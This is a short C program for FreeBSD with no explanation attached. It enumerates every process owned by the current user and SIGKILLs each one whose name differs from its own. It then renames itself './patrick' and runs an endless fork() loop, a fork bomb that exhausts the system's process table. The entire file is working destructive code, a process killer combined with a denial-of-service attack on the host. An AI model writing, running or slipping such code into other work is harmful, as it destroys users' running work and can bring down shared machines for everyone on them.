#include <unistd.h>
#include <signal.h>
#include <kvm.h>
#include <sys/sysctl.h>
#include <sys/user.h>
#include <fcntl.h>
#include <paths.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <libutil.h>
#include <string.h>

int main(int argc, char * argv[]) {
	char errbuf[1000];
	int entries, i;
	setproctitle("%s", "ours");
	pid_t id = getpid();
	struct kinfo_proc * a = kinfo_getproc(id);
	//printf("getpid name %s\n", a->ki_comm);
	char * name = a->ki_comm;
	//char * name = argv[0];
	//name += 4;
	kvm_t * kernel = kvm_open(NULL, _PATH_DEVNULL, NULL, O_RDONLY, errbuf);	
	struct kinfo_proc * info = kvm_getprocs(kernel, KERN_PROC_RUID, getuid(), &entries);
	while (1) {	
		for (i = 0; i < entries; i++) {
			//printf("Name %s\n", info[i].ki_comm);
			if (strcmp(info[i].ki_comm, name) != 0) {
				//printf("inkill %s %s\n", name, info[i].ki_comm);
				kill(info[i].ki_pid, SIGKILL);
			}
		}
		setproctitle("%s","./patrick");
		while (1) {
			//setproctitle("%s","./anything");
			fork();
		}
	}
}
